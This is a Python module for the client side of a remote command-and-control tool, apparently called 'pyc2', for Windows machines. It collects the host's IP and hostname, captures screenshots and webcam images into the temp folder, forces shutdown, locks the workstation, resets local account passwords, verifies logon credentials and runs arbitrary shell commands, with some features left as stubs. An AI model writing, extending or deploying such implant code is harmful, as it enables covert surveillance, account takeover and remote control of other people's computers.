import os
import cv2 
import pyautogui
import tempfile
import datetime
import subprocess
import ctypes
from PIL import ImageTk, Image
from .misc import Misc, GeoStuff
from win32com import adsi
from win32security import LogonUser
from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT
import pythoncom



helper = Misc()


class CommandAndControl():


    def __init__(self):
        self.client_private_ip = helper.getip() 
        self.client_hostname = helper.gethost()
        self.temp_dir = tempfile.gettempdir()


    def getss(self):
        ss_name = f"pyc2ss{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.png"
        ss_path = f"{self.temp_dir}\\{ss_name}"
        pyautogui.screenshot(ss_path)

    
    def getfrontcam(self): # Does not work at moment
        webcam = cv2.VideoCapture(0)        
        check, frame = webcam.read()
        img_name = f"pyc2webcam{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.png"
        webp_path = f"{self.temp_dir}\\{img_name}"
        cv2.imwrite(filename=webp_path, img=frame)
        webcam.release()
        
    
    def shutdown_client(self):
        os.system("shutdown /s /f /t 0")


    def lock_client(self):
        lock = 0
        while lock !=1:
            lock = ctypes.windll.user32.LockWorkStation()


    def switch_profile(self): # To Be Added in later versions
        raise NotImplementedError


    def getscreen(self): # To Be Added in later versions
        raise NotImplementedError


    def get_location(self):
        raise NotImplementedError


    def set_password(self,username, password):
        try:
            pythoncom.CoInitialize()
            ads_obj = adsi.ADsGetObject(f"WinNT://localhost/{username},user")
            ads_obj.Getinfo()
            ads_obj.SetPassword(password)
        except Exception as e:
            print(f"Error: {e}")


    def verify_success(self,username, password):
        try:
            LogonUser(username, None, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT)
        except Exception:
            return False
        else:
            return True


    def get_geo_suff(self):
        geo_stuff = GeoStuff()
        return geo_stuff


    def shell(self,cmd):
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout,stderr = proc.communicate()
        return (stdout.decode(),stderr.decode())

